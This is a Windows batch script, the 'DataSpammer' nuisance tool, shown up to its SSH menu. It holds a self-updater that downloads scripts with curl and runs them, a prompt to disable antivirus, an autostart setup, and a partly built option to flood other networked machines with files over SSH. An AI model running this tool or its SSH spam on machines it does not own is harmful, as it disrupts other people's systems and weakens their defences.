:: Use only under MIT License
:: If you want to Publish a modified Version please mention the Original Creator PIRANY and link the GitHub Repo
:: Some Vars and Settings
::    Todo: 
::    Try to Add a Interaktive CLI Interface, which can be dynamicly called and used by other Scripts. 
::    Add Startmenu Spam
::    Add AppData Spam
::    Add Spam for App List (Settings > Apps > Full Applist)
::    Add Translation
::    Fix no Elevation option
::    Add List Readme and Liscenese
::    Finish Logging
::    Add FTP support

:!top
    @echo off
    mode con: cols=140 lines=40
    set "current-script-version=v3.3"
    if "%1"=="h" goto help.startup
    if "%1"=="-h" goto help.startup
    if "%1"=="help" goto help.startup
    if "%1"=="-help" goto help.startup
    if "%1"=="--help" goto help.startup
    if "%1"=="faststart" goto sys.enable.ascii.tweak
    if "%1"=="update" goto fast.git.update
    if "%1"=="remove" goto sys.delete.script
    if "%1"=="" goto normal.start
    if "%1"=="cli" goto sys.cli
    if "%1"=="api" goto sys.api
    if "%1"=="go" goto custom.go
    if "%1"=="noelev" goto noelev

:noelev
set "elevation.off=1"

:normal.start
    @color 02
    cd /d %~dp0
    @if not defined debug_assist (@ECHO OFF) else (@echo on)
    if not defined devtools (goto top-startup) else (goto dtd)

:top-startup
    set inputFile=settings.conf
    set "firstLine="
    set /p firstLine=<%inputFile%
    if "%firstLine%"=="small-install" (
        set "small-install=1" 
        set "small-install=1" && goto sys.enable.ascii.tweak
    ) else (
        goto sys.req.elevation
    )

:sys.req.elevation
    if "%elevation.off%" == 1 goto check-files
    net session >nul 2>&1
    if %errorLevel% neq 0 (
        powershell -Command "Start-Process '%~f0' -Verb runAs"
        exit
    )
    cd /d %~dp0
    goto check-files



:check-files
    setlocal EnableDelayedExpansion
    cd /d %~dp0
    set "file=settings.conf"
    set "linenr=5"
    set "logging=0"  
    set /a nr=0
    set "foundline=false"
    for /f "tokens=*" %%a in ('type "%file%"') do (
        set /a nr+=1
        if !nr! equ %linenr% (
            set "foundline=true"
            if "%%a"=="logging" (
                set "logging=1"
            ) else (
                set "logging=0"
            )
        )
    )
    if "%foundline%"=="false" (
        set "logging=0"
    )

    if %logging% == 1 ( call :log DataSpammer_Started )
    :: Checks if all Files needed for the Script exist
    setlocal enabledelayedexpansion
    @title Starting Up...
    echo Checking for Data...
    if not exist "settings.conf" goto sys.no.settings
    echo Checking for Files...
    if not exist "install.bat" (goto sys.error.no.install) else (goto settings.extract.update)

:sys.no.settings
    if %logging% == 1 ( call :log Settings-Not-Found )
    :: TLI when Settings arent found
    cls
    echo The File "settings.conf" doesnt exist. 
    @ping -n 1 localhost> nul
    echo Theres a high Chance that the Installer didnt run yet.
    @ping -n 1 localhost> nul
    echo Please consider rerunning the installer to make sure the script can run accurately.
    @ping -n 1 localhost> nul
    echo Do you want to reinstall the Script or do you want to open the Script anyways?
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [1] Open the Installer
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Open the Script anyways 
    @ping -n 1 localhost> nul
    set /p menu=Choose an Option from Above:
    If %menu% == 1 goto sys.open.installer
    If %menu% == 2 goto no.settings.update
    goto sys.no.settings


:no.settings.update
    if %logging% == 1 ( call :log Checking-Update-No-Settings )
    call :gitcall.sys
    set "small-install=1"
    goto sys.enable.ascii.tweak


:settings.extract.update
    if %logging% == 1 ( call :log Checking_Settings_for_Update_Command )
    setlocal enabledelayedexpansion
    set "file=settings.conf"
    set "linenr=4"
    set "searchfor=uy"

    for /f "tokens=1* delims=:" %%a in ('findstr /n "^" "%file%"') do (
        if %%a equ %linenr% (
            set "line=%%b"
            set "line=!line:*:=!"
            if "!line!" equ "!searchfor!" (
                call :gitcall.sys
                goto dts.startup.done
            )
        )
    )
    goto dts.startup.done


:gitcall.sys
    if %logging% == 1 ( call :log Calling_Update_Check )
    call :git.version.check
    call :git.update.check %uptodate%
    exit /b

:git.version.check
    if %logging% == 1 ( call :log Curling_Github_API )
    echo Checking for Updates...
    set "owner=PIRANY1"
    set "repo=DataSpammer"
    set "api_url=https://api.github.com/repos/%owner%/%repo%/releases/latest"
    echo Getting Latest Release Info from API...
    curl -s %api_url% > apianswer.txt
    @ping -n 1 localhost> nul
    echo Got Release Info.
    @ping -n 1 localhost> nul
    echo Awaiting Response...
    @ping -n 1 localhost> nul
    echo Recieved API Response.
    echo Extracting Data...

    for /f "tokens=2 delims=:, " %%a in ('findstr /R /C:"\"tag_name\"" apianswer.txt') do (
        set "latest_version=%%a"
    )
    set "latest_version=%latest_version:"=%"


    
    if "%latest_version%" equ "v3.3" (
        set "uptodate=up"
    ) else (
        set "uptodate="
    )
    del apianswer.txt
    exit /b
    
:git.update.check
    if %logging% == 1 ( call :log Extracting_Data_From_API )
    if "%1"=="up" (
        call :git.version.clean
    ) else (
        call :git.version.outdated
    )
    exit /b

:git.version.outdated
    if %logging% == 1 ( call :log Version_Outdated )
    echo Version Outdated!
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo Please consider downloading the new Version. 
    @ping -n 1 localhost> nul
    echo The Version you are currently using is %current-script-version%
    @ping -n 1 localhost> nul 
    echo The newest Version avaiable is %latest_version%
    @ping -n 1 localhost> nul
    echo.
    echo [1] Update
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Continue Anyways
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    set /p menu4=Choose an Option from Above:
    if "%menu4%" == "1" (
        goto git.update.version
    ) else if "%menu4%" == "2" (
        exit /b
    ) else (
        goto git.version.outdated
    )

:git.version.clean
    if %logging% == 1 ( call :log Version_Is_Up_To_Date )
    echo The Version you are currently using is the newest one (%latest_version%)
    @ping -n 1 localhost> nul
    exit /b


:git.update.version
    if %logging% == 1 ( call :log Creating_Update_Script )
    :: Reworked in v3.3 / should work
    cd /d %~dp0
    echo @echo off > updater.bat
    echo cd /d %~dp0 >> updater.bat
    echo echo Updating script... >> updater.bat
    echo curl -o dataspammer.bat https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/dataspammer.bat >> updater.bat
    echo curl -o install.bat https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/install.bat >> updater.bat
    echo curl -o readme.md https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/readme.md >> updater.bat
    echo curl -o license https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/license >> updater.bat
    echo set "update-install=1" >> updater.bat
    echo start install.bat >> updater.bat
    echo exit >> updater.bat

    start updater.bat
    exit


:sys.error.no.install
    if %logging% == 1 ( call :log Install_Bat_Doesnt_Exist )
    :: TLI When the Installer doesnt exist
    echo The "Install.bat" doesnt exist. Some Features may not work.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [1] Open GitHub for Versions.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Continue Anyways
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    set /p menu3=Choose an Option from Above:
    If %menu3% == 2 goto dts.startup.done
    If %menu3% == 1 goto git.open.repo
    goto sys.error.no.install

:git.open.repo
    if %logging% == 1 ( call :log Opening_Repo )
    :: Open Repo
    start "" "https://github.com/PIRANY1/DataSpammer"
    goto sys.error.no.install

:sys.open.installer
    if %logging% == 1 ( call :log Opening_Installer )
    :: Opens the Installer
    cd /d %~dp0
    install.bat
    if %errorlevel% equ 0 (cls | echo Installer is running....) else (echo There was an Error. Please open the install.bat File manually.)

:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: -------------------------------------------------Start.bat  <- Transition -> DataSpammer.bat------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:dts.startup.done
    if %logging% == 1 ( call :log Script_Was_Opened_From_Installer )
    :: If the Script got opened from installer?
    if "%settingsmainscriptvar%" == "1" goto settings

:check-dev-options
   if %logging% == 1 ( call :log Checking_If_Developer_Mode_Is_Turned_On )
   cd /d %~dp0
   if exist dev.conf (set "dev-mode=1") else (set "dev-mode=0")


:sys.extract.settings.to.var
    if %logging% == 1 ( call :log Extracting_Settings_From_File )
    :: Extract data from Settings file
    setlocal enabledelayedexpansion
    set "file=settings.conf"
    set nr=0
    for /l %%i in (1,1,5) do (
        set "line%%i="
    )
    for /f "delims=" %%a in (%file%) do (
        set /a "nr+=1"
        set "line!nr!=%%a"
    )
    set "insdonevar1=!line1!"
    set "stdfile=!line2!"
    set "stdrc1=!line3!"
    if not defined devtools (goto sys.enable.ascii.tweak) else (goto dtd)

:sys.enable.ascii.tweak
    if %logging% == 1 ( call :log Sending_Notification )
    if %logging% == 1 ( call :log Enabling_ASCII_without_CHCP )
    powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'DataSpammer', 'Started DataSpammer', [System.Windows.Forms.ToolTipIcon]::None)}"
    :: Allows ASCII stuff without Codepage Settings (i use both to be sure)
    SETLOCAL EnableDelayedExpansion
    SET $Echo=FOR %%I IN (1 2) DO IF %%I==2 (SETLOCAL EnableDelayedExpansion ^& FOR %%A IN (^^^!Text:""^^^^^=^^^^^"^^^!) DO ENDLOCAL ^& ENDLOCAL ^& ECHO %%~A) ELSE SETLOCAL DisableDelayedExpansion ^& SET Text=
    SETLOCAL DisableDelayedExpansion

:menu
    if %logging% == 1 ( call :log Startup_Complete )
    title DataSpammer v3.3
    if "%small-install%" == "1" (
        set "settings-lock=Locked. Find Information under [44mHelp[0m"
    ) else (
        set "settings-lock=Settings"
    )
    :: Main Menu TLI

    cls
    if %logging% == 1 ( call :log Displaying_Menu )
    %$Echo% "   ____        _        ____                                            _           ____ ___ ____      _    _   ___   __
    %$Echo% "  |  _ \  __ _| |_ __ _/ ___| _ __   __ _ _ __ ___  _ __ ___   ___ _ __| |__  _   _|  _ \_ _|  _ \    / \  | \ | \ \ / /
    %$Echo% "  | | | |/ _` | __/ _` \___ \| '_ \ / _` | '_ ` _ \| '_ ` _ \ / _ \ '__| '_ \| | | | |_) | || |_) |  / _ \ |  \| |\ V / 
    %$Echo% "  | |_| | (_| | || (_| |___) | |_) | (_| | | | | | | | | | | |  __/ |  | |_) | |_| |  __/| ||  _ <  / ___ \| |\  | | |  
    %$Echo% "  |____/ \__,_|\__\__,_|____/| .__/ \__,_|_| |_| |_|_| |_| |_|\___|_|  |_.__/ \__, |_|  |___|_| \_\/_/   \_\_| \_| |_|  
    %$Echo% "                             |_|                                              |___/                                     



    @ping -n 1 localhost> nul
    echo Made by PIRANY                 v3.3
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [1] Help
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Start
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [3] Cancel
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [4] Credits/Contact
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [5] %settings-lock%
    color 02
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [6] Autostart/Desktop Icon
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [7] Check for Script Updates
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [8] Open GitHub-Repo
    echo.
    echo.
    set /p menu1=Choose an Option from Above:

    If %menu1% == 1 goto help
    If %menu1% == 2 goto start
    If %menu1% == 3 goto cancel
    If %menu1% == 4 goto credits
    If %menu1% == 5 goto settings
    If %menu1% == 6 goto autostart.desktop.settings
    If %menu1% == 7 goto check.lib.git.update
    If %menu1% == 8 start "" "https://github.com/PIRANY1/DataSpammer" | cls | goto menu
    goto menu

:check.lib.git.update
    goto :normal.start

:help
    :: TLI for Infos
    cls
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo No liability for any Damages on your Software.
    @ping -n 1 localhost> nul
    echo If you want to use this Script on a Server you have to be able to write something in the Folder you want to use.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo When youre on a Small Install you cant access the "Locked." Tab because it needs different Variables in the settings.conf file. 
    @ping -n 1 localhost> nul
    echo To use the Settings you need to reinstall the Script. Simply open the Github Repo via the Main Page and choose one of the download Options.
    @ping -n 1 localhost> nul
    echo. 
    @ping -n 1 localhost> nul
    echo [1] Go back
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Exit
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    set /p menu2=Choose an Option from Above:
    If %menu2% == 1 goto menu
    If %menu2% == 2 goto cancel
    goto info

:credits
    :: TLI Code for Credits
    cls 
    echo.
    @ping -n 1 localhost> nul
    echo. 
    @ping -n 1 localhost> nul
    echo This Script is made by PIRANY for Educational Use only.
    @ping -n 1 localhost> nul
    echo The whole Code is made by PIRANY  
    @ping -n 1 localhost> nul
    echo If you found any Bugs/Glitches or have a Problem With this software please Create a Issue on the Github-Repo
    @ping -n 1 localhost> nul
    echo. 
    @ping -n 1 localhost> nul
    echo. 
    @ping -n 1 localhost> nul
    echo [1] Go back
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Open the Github-Repo
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [3] Exit
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    set /p menu3=Choose an Option from Above:
    If %menu3% == 1 goto menu
    If %menu3% == 3 goto cancel
    If %menu3% == 2 start "" "https://github.com/PIRANY1/DataSpammer" | cls | goto credits
    goto credits

:settings
    color
    if %dev-mode% == 1 set "settings-dev-display=Activated"
    if %dev-mode% == 0 set "settings-dev-display=Not Activated"
    :: TLI for Settings - Add Skip Security Question + Always use Custom Directory Yes/No
    cls 
    echo ========
    echo Settings
    echo ========
    echo.
    @ping -n 1 localhost> nul
    echo. 
    @ping -n 1 localhost> nul
    echo [1] Standart Filename (Will have a Number behind.)
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Standard Directory to Spam(idk why you would need this but here you go)
    @ping -n 1 localhost> nul
    echo. 
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [3] [31mActivate Developer Options (Currently %settings-dev-display%) [0m
    @ping -n 1 localhost> nul
    echo. 
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [4] Version Control
    @ping -n 1 localhost> nul
    echo. 
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [5] Logging
    @ping -n 1 localhost> nul
    echo. 
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [6] Experimental Features
    @ping -n 1 localhost> nul
    echo. 
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [7] Restart Script
    @ping -n 1 localhost> nul
    echo. 
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [8] Go back
    @ping -n 1 localhost> nul
    echo. 
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul


    set /p menu4=Choose an Option from Above:
    If %menu4% == 1 goto settings.change.df.filename
    If %menu4% == 2 goto settings.default.directory.crash
    If %menu4% == 3 goto activate.dev.options
    If %menu4% == 4 goto settings.version.control
    If %menu4% == 5 goto settings.logging
    If %menu4% == 6 goto experimental.features
    If %menu4% == 7 goto restart.script
    If %menu4% == 8 goto menu
    goto settings

:experimental.features
    echo [1] Fancy CLI (currently just cmd.exe in Linux Style)
    echo [2] API (In Developement)
    echo [3] New Spams (Coming Soon)
    echo.
    echo [4] Back
    set /P experimental.menu=Choose an Option From Above:
    if %experimental.menu% == 1 goto sys.cli 
    if %experimental.menu% == 2 goto experimental.features REM goto sys.api
    if %experimental.menu% == 3 goto experimental.features REM goto dev.spams
    if %experimental.menu% == 4 goto settings


:settings.version.control
    echo.
    echo.
    @ping -n 1 localhost> nul
    echo [1] Force Update
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Switch to Main Branch
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [3] Switch to Developer Branch
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [4] Go Back
    @ping -n 1 localhost> nul
    echo.
    echo.
    set /P vs.control=Choose an Option From Above:
    if %vs.control% == 1 goto dev.force.update
    if %vs.control% == 2 goto stable.switch.branch
    if %vs.control% == 3 goto dev.switch.branch  
    if %vs.control% == 4 goto settings
    goto settings.version.control

:dev.force.update
    echo Running Update Script...
    @ping -n 1 localhost> nul
    goto git.update.version



:dev.switch.branch
    cd /d %~dp0
    echo @echo off > updater.bat
    echo cd /d %~dp0 >> updater.bat
    echo echo Updating script... >> updater.bat
    echo curl -o dataspammer.bat https://raw.githubusercontent.com/PIRANY1/DataSpammer/refs/heads/beta/dataspammer.bat >> updater.bat
    echo curl -o install.bat https://raw.githubusercontent.com/PIRANY1/DataSpammer/refs/heads/beta/install.bat >> updater.bat
    echo curl -o readme.md https://raw.githubusercontent.com/PIRANY1/DataSpammer/refs/heads/beta/readme.md >> updater.bat
    echo curl -o license https://raw.githubusercontent.com/PIRANY1/DataSpammer/refs/heads/beta/license >> updater.bat
    echo set "update-install=1" >> updater.bat
    echo start install.bat >> updater.bat
    echo exit >> updater.bat

    start updater.bat
    exit /b

:stable.switch.branch
    cd /d %~dp0
    echo @echo off > updater.bat
    echo cd /d %~dp0 >> updater.bat
    echo echo Updating script... >> updater.bat
    echo curl -o dataspammer.bat https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/dataspammer.bat >> updater.bat
    echo curl -o install.bat https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/install.bat >> updater.bat
    echo curl -o readme.md https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/readme.md >> updater.bat
    echo curl -o license https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/license >> updater.bat
    echo set "update-install=1" >> updater.bat
    echo start install.bat >> updater.bat
    echo exit >> updater.bat

    start updater.bat
    exit


:activate.dev.options
    if %dev-mode% == 1 goto open.dev.settings
    echo Do you want to activate the Developer Options?
    echo Developer Options include Debugging, Logging and some extra Menus
    echo This can lead to some instabilty!
        choice /C YN /M "Yes/No"
        set _erl=%errorlevel%
        if %_erl%==Y goto write-dev-options
        if %_erl%==N goto settings
    
:open.dev.settings
cd /d %~dp0 
.\install.bat -dev.secret

:write-dev-options
    cd /d %~dp0
    echo Only delete this File if you want to deactivate Developer Options. > dev.conf
    echo Developer Options have been activated!
    echo Script will now restart
    @ping -n 2 localhost> nul
    goto restart.script

:settings.change.df.filename
    :: Write Standart Filename to File
    cls 
    echo The Filename cant have the following Character(s):\ / : * ? " < > |"
    set /p mainfilename=Type in the Filename you want to use.
    setlocal enabledelayedexpansion
    set "file=settings.conf"
    set "tmpfile=temp.txt"
    set linenumber=0
    (for /f "tokens=*" %%a in (!file!) do (
        set /a "linenumber+=1"
        if !linenumber! equ 2 (
            echo !mainfilename!
        ) else (
            echo %%a
        )
    )) > !tmpfile!
    move /y !tmpfile! !file!
    echo The Standart Filename was saved!
    cls
    goto settings


:settings.default.directory.crash
    :: Standart Spam Directory Check
    cls 
    echo.
    echo.
    set /p directory0=Type Your Directory Here:
    if exist %directory0% (goto settings.default.directory.crash.2) else (goto settings.default.directory.crash.3)

:settings.default.directory.crash.2
    :: Write Standart Spam Directory to Settings
    setlocal ENABLEDELAYEDEXPANSION
    set "setfile=settings.conf"
    set "tmpfile=temp.txt"
    set "lineCounter=0"

    (
      for /f "tokens=*" %%a in (!setfile!) do (
        set /a "lineCounter+=1"
        if !lineCounter! equ 3 (
          echo !directory0!
        ) else (
          echo %%a
        )
      )
    ) > !tmpfile!
    move /y !tmpfile! !setfile!
    echo The Directory was saved!
    cls
    goto settings

:settings.default.directory.crash.3
    :: Not so hard to understand
    echo The Directory is invalid!
    pause
    goto settings.default.directory.crash

:settings.logging
    color 02
    cls
    if %logging% == 1 (
        set "settings.logging=Activated"
    ) else (
        set "settings.logging=Disabled"
    )
    echo Logging is currently: %settings.logging%
    echo.
    @ping -n 1 localhost> nul
    echo [1] Activate Logging
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Disable Logging
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [3] Open Latest Log
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [4] Go Back
    @ping -n 1 localhost> nul
    echo.
    echo.
    set /P vs.control=Choose an Option From Above:
    if %vs.control% == 1 goto enable.logging
    if %vs.control% == 2 goto disable.logging
    if %vs.control% == 3 goto dev.open.log
    if %vs.control% == 4 goto settings
    goto settings.logging

:enable.logging
    cd /d %~dp0
    set "file=settings.conf"
    set "linenr=5"
    set "tempfile=tempfile.conf"
    set /a nr=0
    set "foundLine=false"
    set "logging.content=logging"
    
    (
        for /f "tokens=*" %%a in ('type "%file%" 2^>nul') do (
            set /a nr+=1
            if !nr! equ %linenr% (
                echo %logging.content%
                set "foundLine=true"
            ) else (
                echo %%a
            )
        )
    ) > "%tempfile%"
    
    if "%foundLine%"=="false" (
        echo logging.content >> "%tempfile%"
    )
    
    pause
    move /y "%tempfile%" "%file%"
    echo Enabled Logging. Restarting Script...
    pause
    @ping -n 2 localhost > nul
    goto restart.script


:disable.logging
    cd /d %~dp0
    set "file=settings.conf"
    set "linenr=5"
    set "tempfile=tempfile.conf"
    set /a nr=0
    
    (
        for /f "tokens=*" %%a in ('type "%file%"') do (
            set /a nr+=1
            if !nr! equ %linenr% (
                echo.
            ) else (
                echo %%a
            )
        )
    ) > "%tempfile%"
    move /y "%tempfile%" "%file%"
    echo Disabled Logging. Restarting Script...
    @ping -n 2 localhost> nul
    goto restart.script

:autostart.desktop.settings
    :: Autostart TLI
    echo.
    cls
    echo.
    echo ==================
    echo Autostart/Desktopicon Settings
    echo ==================
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [1] Setup 
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Delete Autostart
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [3] Delete DesktopIcon
    echo.
    @ping -n 1 localhost> nul
    echo [4] Back
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [5] Settings
    echo.
    echo.
    set /p menu000=Choose an Option from Above:

    If %menu000% == 1 goto autostart.setup
    If %menu000% == 2 goto autostart.delete
    If %menu000% == 4 goto menu
    If %menu000% == 3 goto desktop.icon.delete  
    If %menu000% == 5 goto autostart.settings.page
    goto autostart.desktop.settings

:autostart.setup
    :: Autostart Setup TLI - INOPERATIONAL - NEED TO FIX ASAP
    echo This Setup will lead you trough the Autostart/Desktopicon Setup.
    @ping -n 1 localhost> nul
    echo If you are not sure what that is please take a look at the Information.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [1] Start Setup for Autostart
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Start Setup for DesktopIcon
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [3] View Information
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [4] Go Back
    @ping -n 1 localhost> nul
    echo.
    set /p menu123134=Choose an Option from Above:

    If %menu123134% == 3 goto viewdocs 
    If %menu123134% == 1 goto autostart.setup.confirmed
    If %menu123134% == 4 goto autostart
    If %menu123134% == 2 goto desktop.icon.setup
    goto autostart.setup

:viewdocs 
    @ping -n 1 localhost> nul
    echo If you put for example Links or Programms into your Autostart Folder 
    @ping -n 1 localhost> nul
    echo They will automaticly launch if you boot your Device.
    @ping -n 1 localhost> nul
    echo Your System cant be more vulnerable if you do this.
    @ping -n 1 localhost> nul
    echo You can create an Desktop Icon too if you dont want the Script to open 
    @ping -n 1 localhost> nul
    echo Every time you boot.
    @ping -n 1 localhost> nul
    echo Please note that if you change the Directory you also need to change it in the Autostart Settings.
    @ping -n 1 localhost> nul
    echo [1] Go back
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Open Desktop Icon Setup.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [3] Open AutostartSetup
    echo.
    @ping -n 1 localhost> nul
    set /p viewdocsmenu=Choose an Option from above:

    If %viewdocsmenu% == 1 goto autostart.setup
    If %viewdocsmenu% == 2 goto desktop.icon.setup
    If %viewdocsmenu% == 3 goto autostart.setup.confirmed
    goto viewdocs

:autostart.delete
    setlocal enableextensions ENABLEDELAYEDEXPANSION 
    net session >nul 2>&1
    if %errorLevel% == 0 (goto autostart.delete.2) else (goto sys.script.administrator)
:autostart.delete.2
    echo Autostart is getting detected as a Virus from some antivirus Programs. 
    echo A Tutorial on how to temporarily turn off your AV is down below
    echo.
    @ping -n 1 localhost> nul
    echo [1] Open Tutorial on how to turn off AV
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Go back
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [3] My AV is turned off!
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [4] Close the Script
    set /P avturnoff=Choose an Option from above
    if %avturnoff% == 1 start "" "https://www.security.org/antivirus/turn-off/" | cls | goto autostart.delete.2
    if %avturnoff% == 2 cls | goto viewdocs 
    if %avturnoff% == 3 cls | goto autostart.delete.3
    if %avturnoff% == 4 cls | goto cancel
    goto autostart.delete.2

:autostart.delete.3
    @ping -n 1 localhost> nul
    cd /d C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    del autostart.bat
    cd /d %~dp0

:autostart.setup.confirmed
    setlocal enableextensions ENABLEDELAYEDEXPANSION 
    net session >nul 2>&1
    if %errorLevel% == 0 (goto autostart.setup.confirmed.2) else (goto sys.script.administrator)
:autostart.setup.confirmed.2
    @ping -n 1 localhost> nul
    echo The Setup for Autostart is now starting...
    cd /d C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    @ping -n 1 localhost> nul
    echo. > DataSpammer.bat
    set "varlinkauto=%~dp0"
    (
    echo @echo off
    echo cd /d %varlinkauto%
    dataspammer.bat
    ) > autostart.bat
    cd /d %~dp0


:desktop.icon.setup
    setlocal enableextensions ENABLEDELAYEDEXPANSION 
    net session >nul 2>&1
    if %errorLevel% == 0 (goto desktop.icon.setup.2) else (goto sys.script.administrator)
:desktop.icon.setup.2
    cd /d %userprofile%\Desktop
    echo. > DataSpammer.bat
    set "varlinkauto=%~dp0"
    (
    echo @echo off
    echo cd /d %varlinkauto%
    dataspammer.bat
    ) > DataSpammer.bat
    echo Added Icon
    @ping -n 3 localhost> nul
    goto autostart.desktop.settings

:desktop.icon.delete                                                                                                    
    setlocal enableextensions ENABLEDELAYEDEXPANSION 
    net session >nul 2>&1
    if %errorLevel% == 0 (goto desktop.icon.delete.2) else (goto sys.script.administrator)

:desktop.icon.delete.2
    cd %userprofile%\Desktop
    del DataSpammer.bat
    echo Successfully Deleted Desktop Icon.
    @ping -n 2 localhost> nul


:autostart.settings.page
    echo.
    @ping -n 1 localhost> nul
    echo If you have moved the Directory please Delete the Autostart and Then Set it up new
    @ping -n 1 localhost> nul
    pause
    goto autostart.desktop.settings



:start
    call :sys.verify.execution
    cls
    echo Choose the Method you want to use:
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [1] .txt Spam in custom Directory
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Desktop Icon Spam
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [3] Spam Linux/Windows via SSH CURRENTLY ONLY WITH NO PASSWORD
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [4] Go Back
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo.
    set /p spammethod=Choose an Option from Above:

    If %spammethod% == 1 goto normal.text.spam
    If %spammethod% == 2 goto desktop.icon.spam
    If %spammethod% == 3 goto ssh.spam
    If %spammethod% == 4 goto menu
    goto start187

:ssh.spam
    :: Not working - TLI For ssh.spam
    echo In Order to work the Remote Spam Method needs 4 Things.
    @ping -n 1 localhost> nul
    echo 1: The IP of the Device you want to spam
    @ping -n 1 localhost> nul
    echo 2: An Accountname
    @ping -n 1 localhost> nul
    echo 3: The Passwort of the Account
    @ping -n 1 localhost> nul
    echo 4: How many Files you want to create
    @ping -n 1 localhost> nul
    echo.
    echo. 
    echo [1] Continue
    echo.
    echo [2] Back
    echo.
    set /P remotespamchoose=Choose an Option from above:
    if %remotespamchoose% == 1 goto ssh.spam.info
    if %remotespamchoose% == 2 goto start187

:ssh.spam.info
    :: Ask the User to enter the IP - supported with arp
    echo Please specify the IP of the Device
    @ping -n 1 localhost> nul
    echo Down Below are a Few IPs in your Network. 
    arp -a 
    @ping -n 1 localhost> nul
    echo If you need help finding the IP type "help"
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo.
